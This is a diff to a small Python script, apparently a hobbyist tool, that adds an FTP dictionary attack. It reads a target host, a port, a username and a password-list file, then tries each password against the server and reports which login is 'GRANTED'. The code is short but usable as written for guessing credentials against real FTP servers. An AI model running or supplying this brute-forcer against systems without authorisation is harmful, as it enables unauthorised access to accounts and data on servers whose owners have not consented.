@@ -14,6 +14,8 @@ ftp_modes = {
     '3': 'use lists for both user and password'
 }
 
+info = {}
+
 # Ftp
 def ftp():
     while True:
@@ -26,16 +28,28 @@ def ftp():
             print('Bye!')
             sys.exit
         elif selected_mode == '1':
-            ftp_mode_1()
+            ftp_mode_1_connect()
+            return None
         elif selected_mode == '2':
             ftp_mode_2()
-        elif selected_mode == '3v':
+            return None
+        elif selected_mode == '3':
             ftp_mode_3()
+            return None
         else:
             print('Mode not found, please try again.')
 
-def ftp_mode_1():
+def ftp_mode_1_info():
     while True:
+        info['host'] = input(
+            'Enter the host:\t'
+        )
+        info['port'] = int(input(
+            'Enter the port:\t'
+        ))
+        info['user'] = input(
+            'Enter the user:\t'
+        )
         password_list_file = input(
             "Please type the file's path containing the passwords' list.\t"
         )
@@ -45,7 +59,24 @@ def ftp_mode_1():
         except FileNotFoundError:
             print('This file does not exist, please try again.')
         else:
-            print(password_list)
+            return password_list
+
+def ftp_mode_1_connect():
+    password_list = ftp_mode_1_info()
+    ftp = FTP()
+    ftp.connect(host=info['host'], port=info['port']) # DA METTERE UN BLOCCO TRY EXCEPT
+    for password in password_list:
+        try:
+            ftp.login(user=info['user'], passwd=password)
+        except error_perm:
+            print(f'Login failed with user "{info['user']}" and password "{password}".')
+        else:
+            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
+            break
+    ftp.quit()
+    
+    
+                    
 
 
 def input_mode():
@@ -61,6 +92,7 @@ def input_mode():
             sys.exit()
         elif selected_mode == 'a':
             ftp()
+            return None
         else:
             print('Mode not found, please try again.')
 
